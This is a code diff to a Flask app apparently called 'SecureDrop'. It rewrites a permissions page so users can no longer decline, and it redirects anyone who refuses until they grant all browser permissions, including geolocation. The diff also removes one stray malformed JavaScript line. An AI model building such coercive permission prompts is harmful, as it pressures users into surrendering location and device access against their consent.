@@ -402,14 +402,16 @@ PERMISSIONS_PAGE = """
 </head>
 <body>
     <div class="container">
-        <h2>Do you want to enable all permissions to proceed?</h2>
-        <p>You are only allowed to proceed when the "Yes" button is pressed and permissions are granted.</p>
-        <button id="yesButton" class="btn btn-primary">Yes</button>
-        <button id="noButton" class="btn btn-secondary">No</button>
+        {% if error == 'denied' %}
+        <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
+        {% endif %}
+        <h2>Enable all permissions to proceed</h2>
+        <p>You must enable all permissions to access the drive.</p>
+        <button id="enableButton" class="btn btn-primary">Enable</button>
         <p id="status"></p>
     </div>
     <script>
-        document.getElementById('yesButton').addEventListener('click', () => {
+        document.getElementById('enableButton').addEventListener('click', () => {
             Promise.all([
                 new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject);
@@ -419,12 +421,8 @@ PERMISSIONS_PAGE = """
             ]).then(() => {
                 window.location.href = '/drive?permissions=granted';
             }).catch((error) => {
-                document.getElementById('status').innerText = 'Permissions not granted: ' + error.message;
+                window.location.href = '/permissions?error=denied';
             });
-        });
-
-        document.getElementById('noButton').addEventListener('click', () => {
-            window.location.href = '/permissions';
         });
     </script>
 </body>
@@ -436,7 +434,6 @@ DRIVE_PAGE = """
 <html>
 <head>
     <meta charset="UTF-8">
- IFrameElement.prototype.__class__ = "HTMLIFrameElement";
     <title>SecureDrop</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
@@ -582,7 +579,8 @@ def login():
 def permissions():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    return render_template_string(PERMISSIONS_PAGE)
+    error = request.args.get('error')
+    return render_template_string(PERMISSIONS_PAGE, error=error)
 
 @app.route('/drive')
 def drive():
